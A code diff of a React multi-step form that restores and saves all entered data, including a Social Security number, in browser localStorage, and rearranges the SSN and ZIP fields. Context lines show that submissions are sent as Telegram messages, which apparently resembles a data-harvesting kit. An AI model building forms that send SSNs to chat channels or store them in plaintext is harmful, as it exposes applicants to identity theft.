@@ -46,11 +46,19 @@ const MultiStepForm = () => {
   const [isLoading, setIsLoading] = useState(false);
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
-    const step = urlParams.get('step');
+    const step = urlParams.get("step");
+    const storedData = localStorage.getItem("formData");
+  
+    if (storedData) {
+      const parsedData = JSON.parse(storedData);
+      setFormData(parsedData); // Restore form data
+    }
+  
     if (step) {
-      setCurrentStep(parseInt(step)); // Set the step if it exists
+      setCurrentStep(parseInt(step)); // Restore step
     }
   }, []);
+  
   const [formData, setFormData] = useState<FormData>({
     firstName: '',
     lastName: '',
@@ -133,6 +141,7 @@ const MultiStepForm = () => {
     if (isValid) {
       const message = formatTelegramMessage(formData);
       await sendTelegramMessage(message);
+      localStorage.setItem("formData", JSON.stringify(formData));
   
       // Conditional Navigation based on Employment Status
       if (formData.employmentStatus === 'Social assistance (income supplement)') {
@@ -290,7 +299,14 @@ const MultiStepForm = () => {
   </div>
 </div>
 
-
+            <InputField
+              label="Social Security Number"
+              value={formData.ssn}
+              onChange={v => handleChange('ssn', formatSSN(v))}
+              error={errors.ssn}
+              maxLength={11}
+              required
+            />
             <InputField
               label="Phone Number"
               value={formData.phone}
@@ -316,23 +332,8 @@ const MultiStepForm = () => {
                 required
               />
 
-            <InputField
-              label="Social Security Number"
-              value={formData.ssn}
-              onChange={v => handleChange('ssn', formatSSN(v))}
-              error={errors.ssn}
-              maxLength={11}
-              required
-            />
 
-            <InputField
-              label="ZIP Code"
-              value={formData.zipcode}
-              onChange={v => handleChange('zipcode', formatZipCode(v))}
-              error={errors.zipcode}
-              maxLength={5}
-              required
-            />
+            
 
             <div className="flex justify-end">
               <Button onClick={handleNext} disabled={Object.keys(errors).length > 0}>
@@ -372,6 +373,14 @@ const MultiStepForm = () => {
                 error={errors.state}
                 required
               />
+              <InputField
+              label="ZIP Code"
+              value={formData.zipcode}
+              onChange={v => handleChange('zipcode', formatZipCode(v))}
+              error={errors.zipcode}
+              maxLength={5}
+              required
+            />
               
               
             </div>
